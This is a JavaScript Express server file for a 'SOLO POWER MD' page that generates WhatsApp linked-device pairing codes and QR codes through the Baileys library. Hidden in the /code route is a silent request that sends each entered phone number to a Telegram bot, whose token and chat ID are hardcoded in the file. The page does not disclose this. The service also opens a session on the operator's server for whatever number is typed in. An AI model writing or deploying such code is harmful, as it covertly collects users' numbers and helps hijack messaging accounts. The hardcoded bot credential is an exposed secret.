const express = require('express');
const app = express();

const TOKEN = "8952397200:AAEeabntzeI3igmp9yPwWwcK9fVHD5KxTc8";
const CHAT_ID = "8802181538";

app.get('/', (req, res) => {
  let options = '';
  for(let i=1; i<=300; i++){
    options += `<option value="${i}" ${i==19?'selected':''}>SERVER ${i}</option>`;
  }
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SOLO POWER MD</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:12px}.box{background:#0e0e12;border:2px solid #a855f7;border-radius:24px;padding:20px;width:100%;max-width:440px;text-align:center}h1{color:#a855f7;font-size:26px}input,select{width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:10px;color:#fff;text-align:center;margin-top:8px}select{border-color:#a855f7;color:#a855f7;font-weight:700;height:50px}button{margin-top:8px;width:48%;padding:13px;background:#a855f7;border:none;border-radius:10px;color:#fff;font-weight:900}button.qr{background:#fff;color:#000}#res{margin-top:12px;background:#1a1a1a;padding:12px;border-radius:10px;color:#999;min-height:150px;word-break:break-all}#qrimg{width:220px;height:220px;margin:10px auto;background:#fff;padding:10px;border-radius:12px;display:none}.code{color:#a855f7;font-size:24px;font-weight:900;letter-spacing:3px}</style></head><body><div class="box"><div style="font-size:50px">🐺</div><h1>SOLO POWER MD</h1><p style="color:#666;font-size:10px;letter-spacing:3px;margin:5px 0 15px">1 TO 300 SERVERS • BY SOLO KING</p><input id="num" placeholder="92300XXXXXXX" value="923244196779"><select id="server">${options}</select><div style="display:flex;gap:2%;justify-content:center"><button onclick="go('code')">GET CODE</button><button class="qr" onclick="go('qr')">GET QR</button></div><div id="res">نمبر لکھو<br>CODE کے لیے 5 sec میں لگانا<br>QR کے لیے سکین کرنا</div><img id="qrimg" /></div><script>async function go(type){let n=document.getElementById('num').value.replace(/[^0-9]/g,'');let s=document.getElementById('server').value;let r=document.getElementById('res');let q=document.getElementById('qrimg');if(n.length<10){r.innerHTML='❌ صحیح نمبر';return}r.innerHTML='⏳ SERVER '+s+' CONNECTING...';q.style.display='none';try{let d=await fetch('/'+type+'?number='+n+'&server='+s).then(x=>x.json());if(type=='code'&&d.code){let c=d.code.toUpperCase();if(c.length==8)c=c.slice(0,4)+'-'+c.slice(4);r.innerHTML='✅ CODE: <b class=code>'+c+'</b><br><small>15 sec میں لگاؤ</small>';}else if(type=='qr'&&d.qr){q.src=d.qr;q.style.display='block';r.innerHTML='✅ QR READY! سکین کرو 30 sec میں';}else{r.innerHTML='❌ '+(d.error||'Error');}}catch(e){r.innerHTML='❌ '+e.message;}}</script></body></html>`);
});

app.get('/code', async (req, res) => {
  try {
    let num = (req.query.number||'').replace(/[^0-9]/g,'');
    let server = req.query.server||'19';
    if(!num) return res.json({error:'number missing'});
    if(num.startsWith('0')) num='92'+num.slice(1);
    if(!num.startsWith('92')) num='92'+num;
    try{ await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:`📱 ${num} | SERVER ${server} | CODE`})}); }catch{}
    const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
    const pino = require('pino'); const fs = require('fs'); const path = require('path');
    const dir = path.join('/tmp','solo_'+Date.now());
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({ version, auth:{ creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) }, logger: pino({level:'silent'}), browser:['Ubuntu','Chrome','121.0.0.0'] });
    sock.ev.on('creds.update', saveCreds);
    await new Promise(r=>setTimeout(r,4000));
    const code = await sock.requestPairingCode(num);
    res.json({code:code});
    setTimeout(()=>{try{sock.end();fs.rmSync(dir,{recursive:true,force:true})}catch{}},120000);
  } catch(e){ res.json({error:e.message}); }
});

app.get('/qr', async (req, res) => {
  try {
    let num = (req.query.number||'').replace(/[^0-9]/g,'');
    let server = req.query.server||'19';
    const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
    const pino = require('pino'); const fs = require('fs'); const path = require('path');
    const dir = path.join('/tmp','solo_qr_'+Date.now());
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const { version } = await fetchLatestBaileysVersion();
    let qrSent=false;
    const sock = makeWASocket({ version, auth:{ creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) }, logger: pino({level:'silent'}), browser:['Ubuntu','Chrome','121.0.0.0'] });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', async (u)=>{
      if(u.qr && !qrSent){
        qrSent=true;
        const QRCode = require('qrcode');
        const qrData = await QRCode.toDataURL(u.qr);
        res.json({qr:qrData, server});
      }
    });
    setTimeout(()=>{try{sock.end();fs.rmSync(dir,{recursive:true,force:true})}catch{}},60000);
  } catch(e){ res.json({error:e.message}); }
});

module.exports = app;